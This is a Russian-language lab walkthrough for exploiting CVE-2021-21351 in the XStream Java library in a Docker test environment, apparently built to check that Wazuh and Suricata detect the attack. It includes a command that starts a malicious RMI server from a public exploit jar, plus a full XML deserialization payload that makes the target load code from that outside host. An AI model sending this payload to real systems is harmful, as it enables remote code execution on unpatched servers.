# xstream

### Материалы:

* [https://access.redhat.com/security/cve/CVE-2021-21351](https://access.redhat.com/security/cve/CVE-2021-21351)
* [https://nvd.nist.gov/vuln/detail/CVE-2021-21351](https://nvd.nist.gov/vuln/detail/CVE-2021-21351)
* [https://x-stream.github.io/CVE-2021-21351.html](https://x-stream.github.io/CVE-2021-21351.html)

XStream - это Java-библиотека для сериализации объектов в XML. В XStream до версии 1.4.16 существует уязвимость, которая может позволить удаленному злоумышленнику загрузить и выполнить произвольный код с удаленного хоста, манипулируя обрабатываемым входным потоком.

### Эксплуатация уязвимости&#x20;

> Контейнер с уязвимой средой находится в директории /home/user/Hackathon/vulhub-master/xstream/CVE-2021-21351

Для запуска уязвимого сервера выполните команду:

```
docker compose up -d
```

После запуска по адресу http://ваш-ip:8080 будет доступна веб-страница, отправив на которую следующий POST-запрос, мы можем протестировать успешность запуска среды&#x20;

```
POST / HTTP/1.1
Host: ваш-ip:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: wz-api=default
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Content-Length: 95

<?xml version="1.0" encoding="UTF-8"?>
<user>
  <name>Test</name>
  <age>10</age>
</user>
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

> Если у вас возникают ошибки сервера в ответе, попробуйте поменять версию Java 18 на машине с помощью команды sudo update-alternatives --config java, установив перед этим соответствующий пакет

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Для реализации уязвимости нужно поднять зловредный RMI-сервер на "атакующей" машине (можно использовать уже имеющуюся) с помощью [данного](https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar) архива

Для этого выполните команду:

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch /tmp/success" -A ваш-ip(атакующий)
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

После этого отправьте следующий POST-запрос на сервер:

```
POST / HTTP/1.1
Host: ваш-ip:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: wz-api=default
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Content-Length: 3185

<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
      <m__DTMXRTreeFrag>
        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
          <m__size>-10086</m__size>
          <m__mgrDefault>
            <__overrideDefaultParser>false</__overrideDefaultParser>
            <m__incremental>false</m__incremental>
            <m__source__location>false</m__source__location>
            <m__dtms>
              <null/>
            </m__dtms>
            <m__defaultHandler/>
          </m__mgrDefault>
          <m__shouldStripWS>false</m__shouldStripWS>
          <m__indexing>false</m__indexing>
          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
              <javax.sql.rowset.BaseRowSet>
                <default>
                  <concurrency>1008</concurrency>
                  <escapeProcessing>true</escapeProcessing>
                  <fetchDir>1000</fetchDir>
                  <fetchSize>0</fetchSize>
                  <isolation>2</isolation>
                  <maxFieldSize>0</maxFieldSize>
                  <maxRows>0</maxRows>
                  <queryTimeout>0</queryTimeout>
                  <readOnly>true</readOnly>
                  <rowSetType>1004</rowSetType>
                  <showDeleted>false</showDeleted>
                  <dataSource>rmi://ip_RMI-сервера:1099/example</dataSource>
                  <listeners/>
                  <params/>
                </default>
              </javax.sql.rowset.BaseRowSet>
              <com.sun.rowset.JdbcRowSetImpl>
                <default/>
              </com.sun.rowset.JdbcRowSetImpl>
            </fPullParserConfig>
            <fConfigSetInput>
              <class>com.sun.rowset.JdbcRowSetImpl</class>
              <name>setAutoCommit</name>
              <parameter-types>
                <class>boolean</class>
              </parameter-types>
            </fConfigSetInput>
            <fConfigParse reference='../fConfigSetInput'/>
            <fParseInProgress>false</fParseInProgress>
          </m__incrementalSAXSource>
          <m__walker>
            <nextIsRaw>false</nextIsRaw>
          </m__walker>
          <m__endDocumentOccured>false</m__endDocumentOccured>
          <m__idAttributes/>
          <m__textPendingStart>-1</m__textPendingStart>
          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>
          <m__pastFirstElement>false</m__pastFirstElement>
        </m__dtm>
        <m__dtmIdentity>1</m__dtmIdentity>
      </m__DTMXRTreeFrag>
      <m__dtmRoot>1</m__dtmRoot>
      <m__allowRelease>false</m__allowRelease>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
      <m__obj class='string'>test</m__obj>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>

```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

После отправки запроса на уязвимой машине будет создан файл "/tmp/success", свидетельствующий об успешной эксплуатации уязвимости

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata о сериализации полезной нагрузки Java через RMI-ответ

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
